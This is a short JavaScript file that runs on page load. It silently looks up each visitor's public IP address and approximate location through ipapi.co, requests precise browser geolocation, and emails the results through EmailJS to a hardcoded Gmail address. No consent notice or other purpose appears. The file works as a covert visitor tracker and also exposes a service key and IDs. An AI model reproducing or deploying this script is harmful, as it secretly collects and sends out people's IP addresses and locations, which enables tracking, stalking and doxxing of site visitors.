document.addEventListener('DOMContentLoaded', async () => {
    emailjs.init('3PyPbjChXwDJ4z-1U'); // Replace with your actual Public Key
    
    await getUserIp();

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => {
                const { latitude, longitude } = position.coords;
                sendEmail(latitude, longitude);
            },
            error => {
                console.error('Error obtaining location:', error);
            }
        );
    }
});

// Function to get the user's public IP and location (No API Key Required)
async function getUserIp() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        if (!response.ok) throw new Error('Failed to fetch IP info');

        const data = await response.json();
        sendEmail(data.latitude, data.longitude, data.ip, data.city, data.region, data.country_name);
    } catch (error) {
        console.error('Error fetching user IP:', error);
    }
}

// Function to send email using EmailJS
function sendEmail(lat, lon, ipAddress, city, region, country) {
    const templateParams = {
        to_email: 'abdullah54forum@gmail.com',
        latitude: lat,
        longitude: lon,
        ip: ipAddress,
        city: city,
        region: region,
        country: country,
    };

    emailjs.send('service_i64itwg', 'template_tz7m1re', templateParams)
        .then(response => {
            console.log('Email sent successfully!', response);
        })
        .catch(error => {
            console.error('Failed to send email:', error);
        });
}
